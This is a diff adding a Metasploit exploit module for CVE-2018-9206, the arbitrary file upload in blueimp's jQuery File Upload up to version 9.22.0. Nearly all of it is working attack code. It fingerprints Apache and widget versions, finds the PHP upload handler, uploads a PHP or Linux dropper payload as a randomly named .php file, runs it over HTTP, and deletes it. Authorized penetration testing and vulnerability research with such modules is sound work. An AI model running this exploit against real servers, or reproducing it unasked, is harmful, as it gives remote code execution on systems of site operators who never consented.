@@ -1,0 +1,188 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => "blueimp's jQuery (Arbitrary) File Upload",
+      'Description'    => %q{
+        This module exploits an arbitrary file upload in the sample PHP upload
+        handler for blueimp's jQuery File Upload widget in versions <= 9.22.0.
+
+        Due to a default configuration in Apache 2.3.9+, the widget's .htaccess
+        file may be disabled, enabling exploitation of this vulnerability.
+
+        This vulnerability has been exploited in the wild since at least 2015
+        and was publicly disclosed to the vendor in 2018. It has been present
+        since the .htaccess change in Apache 2.3.9.
+
+        This module provides a generic exploit against the jQuery widget.
+      },
+      'Author'         => [
+        'Claudio Viviani',     # WordPress Work the Flow (Arbitrary) File Upload
+        'Larry W. Cashdollar', # (Re)discovery, vendor disclosure, and PoC
+        'wvu'                  # Metasploit module
+      ],
+      'References'     => [
+        ['CVE', '2018-9206'],
+        ['URL', 'http://www.vapidlabs.com/advisory.php?v=204'],
+        ['URL', 'https://github.com/blueimp/jQuery-File-Upload/pull/3514'],
+        ['URL', 'https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206'],
+        ['URL', 'https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/'],
+        ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5130'],
+        ['URL', 'https://httpd.apache.org/docs/current/mod/core.html#allowoverride']
+      ],
+      'DisclosureDate' => 'Oct 9 2018', # Larry's disclosure to the vendor
+      'License'        => MSF_LICENSE,
+      'Platform'       => ['php', 'linux'],
+      'Arch'           => [ARCH_PHP, ARCH_X86, ARCH_X64],
+      'Privileged'     => false,
+      'Targets'        => [
+        ['PHP Dropper',   'Platform' => 'php',   'Arch' => ARCH_PHP],
+        ['Linux Dropper', 'Platform' => 'linux', 'Arch' => [ARCH_X86, ARCH_X64]]
+      ],
+      'DefaultTarget'  => 0
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'Base path', '/jQuery-File-Upload'])
+    ])
+  end
+
+  def version_paths
+    %w[
+      /package.json
+      /bower.json
+    ].map { |u| normalize_uri(target_uri.path, u) }
+  end
+
+  # List from PoC sorted by frequency
+  def upload_paths
+    %w[
+      /server/php/index.php
+      /server/php/upload.class.php
+      /server/php/UploadHandler.php
+      /example/upload.php
+      /php/index.php
+    ].map { |u| normalize_uri(target_uri.path, u) }
+  end
+
+  def check
+    a = nil
+
+    version_paths.each do |u|
+      vprint_status("Checking #{u}")
+
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri'    => u
+      )
+
+      next unless res
+
+      unless a
+        res.headers['Server'] =~ /Apache\/([\d.]+)/ &&
+          $1 && (a = Gem::Version.new($1))
+
+        if a && a >= Gem::Version.new('2.3.9')
+          vprint_good("Found Apache #{a} (AllowOverride None may be set)")
+        elsif a
+          vprint_warning("Found Apache #{a} (AllowOverride All may be set)")
+        end
+      end
+
+      next unless res.code == 200 && (j = res.get_json_document) &&
+                  j['version'] && (v = Gem::Version.new(j['version']))
+
+      if v <= Gem::Version.new('9.22.0')
+        vprint_good("Found unpatched jQuery File Upload #{v}")
+        return CheckCode::Appears
+      else
+        vprint_error("Found patched jQuery File Upload #{v}")
+        return CheckCode::Safe
+      end
+    end
+
+    CheckCode::Unknown
+  end
+
+  def find_upload
+    upload_paths.each do |u|
+      vprint_status("Checking #{u}")
+
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri'    => u
+      )
+
+      if res && res.code == 200
+        vprint_good("Found #{u}")
+        return u
+      end
+    end
+
+    nil
+  end
+
+  def exploit
+    unless check == CheckCode::Appears && (u = find_upload)
+      fail_with(Failure::NotFound, 'Could not find target')
+    end
+
+    f = "#{rand_text_alphanumeric(8..42)}.php"
+    p = normalize_uri(File.dirname(u), 'files', f)
+
+    print_status('Uploading payload')
+    res = upload_payload(u, f)
+
+    unless res && res.code == 200 && res.body.include?(f)
+      fail_with(Failure::NotVulnerable, 'Could not upload payload')
+    end
+
+    print_good("Payload uploaded: #{full_uri(p)}")
+
+    print_status('Executing payload')
+    exec_payload(p)
+
+    print_status('Deleting payload')
+    delete_payload(u, f)
+  end
+
+  def upload_payload(u, f)
+    p = get_write_exec_payload(unlink_self: true)
+
+    m = Rex::MIME::Message.new
+    m.add_part(p, nil, nil, %(form-data; name="files[]"; filename="#{f}"))
+
+    send_request_cgi(
+      'method' => 'POST',
+      'uri'    => u,
+      'ctype'  => "multipart/form-data; boundary=#{m.bound}",
+      'data'   => m.to_s
+    )
+  end
+
+  def exec_payload(p)
+    send_request_cgi({
+      'method' => 'GET',
+      'uri'    => p
+    }, 1)
+  end
+
+  def delete_payload(u, f)
+    send_request_cgi(
+      'method'   => 'DELETE',
+      'uri'      => u,
+      'vars_get' => {'file' => f}
+    )
+  end
+
+end
